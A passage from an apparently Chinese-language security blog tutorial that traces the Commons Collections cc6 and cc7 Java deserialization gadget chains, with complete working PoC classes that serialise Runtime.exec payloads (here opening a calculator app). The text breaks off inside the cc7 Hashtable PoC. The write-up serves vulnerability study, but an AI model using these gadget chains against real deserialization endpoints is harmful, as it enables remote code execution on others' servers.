src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213024813.png" alt="image-20210516213024813"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516213038915.png" alt="image-20210516213038915"></p><p>调用了k.hashCode。</p><p>所以很容易想当然地构造出来一版PoC：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221018615.png" alt="image-20210516221018615"></p><p>但是你会发现，<strong>在put操作处就会触发payload了，根本不是在readObject里面</strong>。</p><p>跟进去看看，这里面直接就触发了利用链，所以我们希望利用链触发在readObejct的位置。</p><p>如果想在readObject位置触发，跟几步发现，需要在LazyMap的get方法中让下面这个判断成立，才能进入transform：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516221822432.png" alt="image-20210516221822432"></p><p>这里面的map就是LazyMap，key就是123</p><p>我们当然希望返回值是false</p><p>继续跟进LazyMap的containsKey：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222703891.png" alt="image-20210516222703891"></p><p>希望getEntry(key)==null</p><p>继续跟进getEntry，这里面的key是123：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222727559.png" alt="image-20210516222727559"></p><p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517095158842.png" alt="image-20210517095158842"></p><p>table是什么呢？</p><p>当我们第一次：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">hashMap.put(tmap, <span class="string">"test"</span>);</span><br></pre></td></tr></table></figure><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517100233906.png" alt="image-20210517100233906"></p><p>虽然我们调用的是无参构造方法，但是这里会给我们安排到有参构造方法。</p><p><code>DEFAULT_INITIAL_CAPACITY = 16</code>进入有参构造方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103659313.png" alt="image-20210517103659313"></p><p>这个table属于最外面的hashMap，他的长度为16</p><p>继续跟进到TiedMapEntry的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517102800741.png" alt="image-20210517102800741"></p><p>这里面的map是LazyMap类的对象，也就是我们传进去的lazyMap</p><p>继续跟，来到LazyMap的get方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517103044779.png" alt="image-20210517103044779"></p><p>这里面的map是我们传进去的innermap，也就是hashmap类型</p><p>跟进去看，</p><p>这里可以看到，先有一个key是否为null的判断，<strong>123不为null所以执行了hash(key)</strong></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517104830975.png" alt="image-20210517104830975"></p><p>所以这里e为null，返回null。成功会在put触发。</p><p>但是不要忘了put之后的状态：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110138797.png" alt="image-20210517110138797"></p><p>lazymap.map就被放入了一个key，key的entry。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517110237951.png" alt="image-20210517110237951"></p><p>假如说这时候我们再通过HashMap的readObject方法来到LazyMap的get方法这里，当再次经过这次判断的时候，因为map里已经存放了entry&lt;“123”，“123”&gt;，那么就不再会是false，导致无法进入transform方法，利用链断掉。</p><p>所以我们需要把map的内容改掉：</p><p>两种方法都行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lazyMap.remove(<span class="number">123</span>);</span><br><span class="line">lazyMap.clear(</span><br></pre></td></tr></table></figure><p>我们可以改写一下，将lazyMap中hashmap的put之后的key去掉，这样就可以先执行，然后在反序列化时候再执行一遍：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516222948500.png" alt="image-20210516222948500"></p><h3 id="HashMap版PoC"><a href="#HashMap版PoC" class="headerlink" title="HashMap版PoC"></a>HashMap版PoC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">public class HashMap_Exploit &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        Transformer[] transformers_exec = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;open /Applications/Calculator.app&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = new ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = new HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = new TiedMapEntry(lazyMap, 123);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(tmap, &quot;test&quot;);</span><br><span class="line">        lazyMap.remove(&quot;123&quot;);</span><br><span class="line"></span><br><span class="line">        //payload序列化写入文件，模拟网络传输</span><br><span class="line">        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty(&quot;user.dir&quot;)+&quot;/src/main/resources/Payload_cc6_HashMap.ser&quot;)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        //服务端读取文件，反序列化，模拟网络传输</span><br><span class="line">        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty(&quot;user.dir&quot;)+&quot;/src/main/resources/Payload_cc6_HashMap.ser&quot;)));</span><br><span class="line">        //服务端反序列化，触发漏洞</span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="fake-chain版PoC"><a href="#fake-chain版PoC" class="headerlink" title="fake chain版PoC"></a>fake chain版PoC</h3><p>既然现在来到了如何绕过put方法的提前执行，可以在构造LazyMap方法的时候穿进去一个空的chain，之后再利用反射将lazymap内部的<code>_itransformer</code>属性改回到真正的chain，这样就可以只最终的反序列化触发点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fackchain_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//fake chain</span></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先构造假的chain</span></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tmap, <span class="string">"test"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//用反射再改回真的chain</span></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(chain, transformers_exec);</span><br><span class="line">        <span class="comment">//清空由于 hashMap.put 对 LazyMap 造成的影响</span></span><br><span class="line">        lazyMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_fakechain.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="HashSet版PoC"><a href="#HashSet版PoC" class="headerlink" title="HashSet版PoC"></a>HashSet版PoC</h3><p>在HashMap的hash中，k目前还是不可控的，所以还需要找哪些函数调用了hash函数，发现HashMap自己的put方法调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215129678.png" alt="image-20210516215129678"></p><p>然而这里的key还是不可控的，所以我们要找哪里调用了put方法，发现HashSet的readObject很合适：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210516215400317.png" alt="image-20210516215400317"></p><p>HashSet的底层其实还是HashMap类，我们需要让HashSet的map属性为HashMap，显然可控。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517111854587.png" alt="image-20210517111854587"></p><h3 id="最终版本PoC-7"><a href="#最终版本PoC-7" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashSet_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers_exec = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer chain = <span class="keyword">new</span> ChainedTransformer(transformers_exec);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap,chain);</span><br><span class="line">        TiedMapEntry tmap = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line">        HashSet hashset = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将map属性设置为我们的tmap</span></span><br><span class="line">        <span class="comment">//1.先拿到handle</span></span><br><span class="line">        Field map = Class.forName(<span class="string">"java.util.HashSet"</span>).getDeclaredField(<span class="string">"map"</span>);</span><br><span class="line">        map.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap hashset_map = (HashMap) map.get(hashset);</span><br><span class="line">        <span class="comment">//2.拿到map的table属性，里面应该存放entry</span></span><br><span class="line">        Field table = Class.forName(<span class="string">"java.util.HashMap"</span>).getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        table.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[])table.get(hashset_map);</span><br><span class="line">        <span class="comment">//3.将第一个entry的key设置为我们的tmap</span></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        Field key = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        key.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        key.set(node,tmap);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_HashSet.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然中间用到了LazyMap，那么又可以复用，InstantiateTransformer和TemplatesImpl，PoC就不粘在这里了，可以去看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p><h2 id="cc7"><a href="#cc7" class="headerlink" title="cc7"></a>cc7</h2><p>条件：</p><ul><li><p><strong>commons-collections:3.1-3.2.1</strong></p></li><li><p><strong>jdk1.7&amp;1.8</strong></p></li></ul><h3 id="利用链寻找-6"><a href="#利用链寻找-6" class="headerlink" title="利用链寻找"></a>利用链寻找</h3><p>cc7的想法依然是寻找LazyMap.get()的触发点。</p><p>cc7的后半段和cc1的lazymap版本一样，触发点选择到了AbstractMap的equals方法来触发对LazyMap的get方法的调用：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517121849144.png" alt="image-20210517121849144"></p><p>这里如果m是可控的，那么可以设置m为LazyMap，这样就可以触发调用链的后半部分。</p><p>这里要寻找哪里调用了equals方法，ysoserial找到了HashTable的reconstitutionPut方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122453468.png" alt="image-20210517122453468"></p><p>这里面e是参数tab的索引，如果e.key是AbstractMap，那么就可以调用AbstractMap.equals方法。</p><p>现在问题来到了，如何才能触发reconstitutionPut方法呢？</p><p>我们发现在HashTable的readObject方法里面就调用了reconstitutionPut方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517122844443.png" alt="image-20210517122844443"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">     <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    <span class="keyword">int</span> origlength = s.readInt();</span><br><span class="line">    <span class="keyword">int</span> elements = s.readInt();<span class="comment">//elements hashtable中的元素个数</span></span><br><span class="line">    ....</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;<span class="comment">//通过elements的长度读取键值对</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">        reconstitutionPut(table, key, value);<span class="comment">//该函数会对元素进行比较</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.table = newTable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看reconstitutionPut方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hash = hash(key);<span class="comment">//计算key的hash</span></span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;<span class="comment">//通过hash确定索引</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有相同元素，创建元素到hashtable中</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们跟着reconstitutionPut走，reconstitutionPut方法有三个参数：</p><p>table，key，value(后面这两个是流操作，看过writeObject就知道是hashtable自己的key和value属性)</p><p>跟进去reconstitutionPut：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517133736874.png" alt="image-20210517133736874"></p><p>我们当然希望走的是AbstractMap类的equals方法，并且保证参数key是LazyMap类型，这样就可以走上LazyMap.get这条熟悉的道路了。</p><p><strong>AbstractMap类是一个抽象类，他实现了Map接口中的equals方法。</strong></p><p><strong>HashMap是AbsrtactMap的实现类，他没有重写equals方法，所以如果是HashMap#equals方法，其实走的是AbstractMap的equals方法。</strong></p><p>也就是说，如果<code>e.key</code>是HashMap，<code>参数(key)</code>是LazyMap，是可以走得通的。</p><p>但是怎么才能走到这个判断呢，需要先保证前半部分<code>e.hash == hash</code>，其实在String.equals()方法中存在hash碰撞。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String a = <span class="string">"yy"</span>;</span><br><span class="line">String b = <span class="string">"zZ"</span>;</span><br><span class="line">a.hashcode() == b.hashcode();<span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>大家不要忘了，要想走到这里，最外层还有一个<code>e!=null</code>条件。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517143801027.png" alt="image-20210517143801027"></p><p>tab就是table属性，table是Hashtable用来存放entry的数组，初始状态就算有长度也是null占位。</p><p>所以我们要像进入if，需要<code>e!=null</code>成立。</p><p>需要先有一个lazymap进来，将table属性赋值、还有将hash值改成自己的参数，等后续第二个进来的lazymap再触发。</p><p>第二个进来的lazymap，才会符合e不为空，将自己的hash和e.hash比较。（用yy和zZ绕过）</p><p>进入e.key.equals(key)，e.key就是第一次进来的lazymap，参数key就是第二次进来的lazymap的innermap。</p><p>还有个细节，在第二次进入后，会进入lazymap2.equals(innermap2)</p><p>equals方法属于HashMap的父类AbstractMap，对于这部分来说，</p><p>LazyMap继承了AbstractMapDecorator的map属性，是Map接口，所以当构造函数的参数是HashMap类型，自然就是LazyMap的map属性自然就是HashMap类型了。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517144833958.png" alt="image-20210517144833958"></p><p>但是HashMap并没有equals方法，实际上走的是父类AbstractMap#equals方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517150342575.png" alt="image-20210517150342575"></p><h3 id="最终版本PoC-8"><a href="#最终版本PoC-8" class="headerlink" title="最终版本PoC"></a>最终版本PoC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashTable_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> Transformer[]&#123;&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers_exec = <span 